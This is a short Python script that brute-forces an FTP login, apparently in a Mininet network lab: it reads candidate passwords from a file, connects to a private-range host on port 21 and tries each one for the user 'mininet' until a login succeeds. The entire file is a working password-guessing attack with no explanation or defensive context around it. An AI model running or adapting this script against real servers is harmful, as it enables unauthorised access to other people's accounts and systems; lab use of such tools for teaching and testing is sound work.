import ftplib

if __name__ == "__main__":
    with open("passwords.txt", "r") as f:
        for password in f.readlines():
            target = ftplib.FTP()
            target.connect(host="10.12.0.40", port=21)
            password = password.rstrip('\n')
            print(f"trying {password}", end=" ")
            try:
                target.login("mininet", password)
                print("-> success")
                break
            except Exception:
                print("-> fail")
